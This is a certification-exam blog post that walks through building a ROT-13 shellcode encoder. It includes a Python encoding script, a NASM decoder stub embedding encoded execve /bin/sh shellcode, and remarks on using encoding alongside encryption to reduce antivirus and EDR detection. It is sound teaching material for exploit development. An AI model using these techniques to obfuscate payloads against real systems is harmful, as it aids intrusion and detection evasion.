# SLAE Exam Assignment 4 - Creating a custom shellcode encoder

## Prologue
The fourth assignment that we have for our SLAE Certification exam is creating a custom shellcode encoder using all that we have learnt so far from the course.

In this blog post, I am going to discuss what is a shellcode encoder, walk you guys through the creation process and at last show you a demo of what we have created.

So without any further ado, here it goes!

## Shellcode Encoder Explained
So the big question is what's a shellcode encoder?

I'd define an encoder as a piece of code that takes your shellcode as input and encodes/obfuscates/morphs it in a way such that all bad characters including null bytes, new lines etc are removed from the shellcode and also appends a small stub to the shellcode which aids in decoding/changing it back to the original shellcode for execution on the target system.

This has another obvious benefit apart from removing bad characters as many of you might know from practical experience.

It obfuscates the shellcode which may hide it's true intentions from some AV/EDR solutions, therefore, lowering the detection rate on some site like VirusTotal but make no mistake, **AV evasion is not the primary objective of using a shellcode encoder** and it provides no real security to your payload because there's **no encryption happening** which means the encoding/obfuscation is usually trivial to reverse.

Ergo, always use encryption for implant security, AV/EDR evasion and Encoders for a preliminary obfuscation and removing bad characters. Ideally, you would want to use both, first encoding and then encrypting the payload. Refer to [Blog Post 7](https://slaeryan.github.io/posts/slae-assignment7-blogpost.html) for a primer on creating your own shellcode crypter.

So with that being explained many of you might have used the famous(or rather infamous!)Shikata Ga Nai Encoder from Metasploit package to obfuscate or bypass some AVs till it got burnt out and now all payloads keep getting attributed :(

Worry not! Here's how you can create your own shellcode encoder from scratch.

## Encoding algorithm
There can be many algorithms for encoding a shellcode including(but not limited to):
1. Adding garbage bytes in specific positions
1. XORing the bytes with a hard-coded single-byte key
1. Shifting the bytes by some specific positions
1. Exchanging consecutive bytes

Or a chain of these abovementioned techniques in any desired way etc. 

For the purposes of this blog post however, I have chosen a cipher named _ROT-13_ which is one of the variations of the earliest known ciphers - _Caesar cipher_.

In other words, ROT-13 is a Caesar cipher with n=13 or every character in the original message is substituted by 13 places which means we are simply going to add 13(0x0d) to every byte in the original shellcode to obfuscate it and then subtract the same from the encoded shellcode to reverse the effect before execution.

The reasons for choosing so are simple:
1. It will be easy to implement and easy for all readers to comprehend.
1. We don't need to bypass AVs using an encoder so we don't exactly need a very complicated chained multiple encoding schema.
1. Furthermore, I admit to being lazy :0

Plus, we can always build upon this as and when required which shouldn't be a very difficult task if we get our fundamentals clear. 

## Creating an Encoder prototype
Our first objective shall be to encode an original shellcode string using our chosen algorithm utilizing a wrapper script which will spit out the encoded shellcode string.

Here's a python script of the prototype encoder:

```python
# Name: encoder_proto.py
# Author: Upayan a.k.a slaeryan
# SLAE: 1525
# Contact: upayansaha@icloud.com
# Purpose: The script takes a shellcode hex string as input from user and
# converts it into a ROT-13 encoded shellcode byte string and prints 
# it to stdout in a format suitable for the decoder NASM stub.
# Testing: 31c050682f2f7368682f62696e89e35089e25389e1b00bcd80 (execve /bin/sh)
# Run with:
# python3 encoder_proto.py
# Note: The original shellcode cannot contain null-bytes(0x00)


def main():
	shellcode_hex = input("Enter the shellcode hex string: ")
	counter = 1
	byte = ''
	encoded_shellcode = ''
	for i in shellcode_hex:
		if (counter % 2 == 0):
			byte = byte + i
			byte = int(byte, 16)
			byte = hex(byte+13)
			if(len(byte)==3):
				byte = byte[:2] + '0' + byte[2:]
			byte = byte + ","
			encoded_shellcode = encoded_shellcode + byte
			byte = ''
		else:
			byte = byte + i
		counter += 1
	encoded_shellcode = encoded_shellcode + "0x0d"
	print("\n")
	print("The ROT-13 encoded shellcode byte string is:", encoded_shellcode)


main()
```

This script just takes a shellcode as input from user and encodes it by adding 13(0x0d to each byte and then prints it. Keep in mind, this is just the prototype encoder and it doesn't incorporate a stub for decoding yet. Also, I am not a coder so please forgive the errors which might have gone unnoticed by my eyes and the messy code in general.

Here's a demo of the prototype in action:

<script id="asciicast-yrj6KgSJj9OnZFHoCh2n91kEV" src="https://asciinema.org/a/yrj6KgSJj9OnZFHoCh2n91kEV.js" async></script>

So let's make the stub now.

## Creating a decoder NASM stub
First, let's talk about what's a stub. A stub is basically a piece of code which is usually appended to the encoded shellcode to aid in decoding and execution of the encoded shellcode. 

In other words, we want to create a Linux/x86 assembly code into which our encoded shellcode from the previous step is embedded and it will execute the shellcode after decoding it successfully.

Here's the NASM source:

```nasm
; Filename: rot13_decoder_stub_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux stub for decoding and executing a ROT-13 encoded 
; shellcode.
; Usage: ./rot13_decoder_stub_shellcode
; Compile with:
; ./compile.sh rot13_decoder_stub_shellcode
; Size of shellcode: 16 bytes(Stub)


global _start

section .text
_start:

    jmp short call_decoder     ; Using the JMP-CALL-POP technique - JMP section

    initiate_decoder:          ; Start the decoding of the shellcode - POP section
    pop esi                    ; Pop the shellcode which is in TOS into ESI register

    decoder_loop:              ; Actual decoding happens here in a loop
    sub byte [esi], 13         ; Get original shellcode by subtracting 13
    jz Shellcode               ; Break condition hits when we get 0 and transfer execution flow to decoded shellcode 
    inc esi                    ; Increment ESI to decode each and every byte
    jmp short decoder_loop     ; Run decoder_loop on every byte till we get 0 on subtracting indicating end of shellcode

    call_decoder:              ; CALL section
    call initiate_decoder      ; Goto initiate_decoder function to put the shellcode onto the stack
    ; The encoded shellcode for execve /bin/sh is defined below, change if required.
    Shellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d,0x0d
```

We are using the JMP-CALL-POP technique here to subtract every byte by 13(0x0d) which will get our original shellcode back and then we transfer our execution flow to the original shellcode. The code is commented on every line to help us understand what's going on in each step and honestly, there's not much to explain here.

Here's a demo of the stub in action:

<script id="asciicast-zHWcBIMJJiDi5pmqCiQpmwrTg" src="https://asciinema.org/a/zHWcBIMJJiDi5pmqCiQpmwrTg.js" async></script>

## Final step: Creating the Encoder
Our final step is to somehow add the stub to the encoded shellcode itself such that it is self-contained.

What do I mean by that?

It means that the output of the shellcode encoder will be sufficient enough to be executed by itself and won't require another "stager" to run it since we are adding the stub to decode the shellcode to it.

Making this was super-easy. First I converted the decoder NASM stub ELF executable to a shellcode hex string using `converter.py` script. After removing the encoded shellcode which was hard-coded in, I embedded the remaining part in this encoder script. Rest is same as creating the prototype encoder - ROT-13 encoding the input shellcode. I have also created a shellcode loader program which basically takes the shellcode as console argument in hex string format and executes it(saves me from copy-paste-compile cycle - lazy!)

This script also outputs the encoded shellcode in C-string format for those of you wishing to keep it test it that way.

One thing to keep in mind is that using a shellcode encoder your output shellcode size will increase almost always because even though our algorithm doesn't add garbage bytes for obfuscation the stub is added to the encoded shellcode making it bigger than the original.

The size of the stub is 16 bytes. So whatever is your original shellcode length, adding 16 to that would be the length of the encoded shellcode.

Since the code is a bit long to be included here I have refrained from adding it here. You can find the link to the source code of this shellcode encoder if you scroll below.

Here is a demo of the final shellcode encoder in action:

<script id="asciicast-xrd1mdY0Btt23MyiQAzO1ku6s" src="https://asciinema.org/a/xrd1mdY0Btt23MyiQAzO1ku6s.js" async></script>

## Code links:
All the code referred to or used in this project is listed as follows:

1. [The Encoder Prototype](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/encoder_proto.py)
1. [The NASM Stub source](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/rot13_decoder_stub_shellcode.nasm)
1. [compile.sh](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/compile.sh)
1. [converter.py](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/converter.py)
1. [The Final Shellcode Encoder](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/shellcode_encoder.py)
1. [The Shellcode Loader Program](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/shellcode_loader)
1. [shellcode_loader.cpp](https://github.com/slaeryan/SLAE-Code-Repository/blob/master/Assignment%204/shellcode_loader.cpp)

Feel free to use and modify all of the above code as and when you see fit. 

Cheers!

## Note
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

<br />

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](https://www.pentesteracademy.com/course?id=3)

<br />

Student ID: SLAE-1525
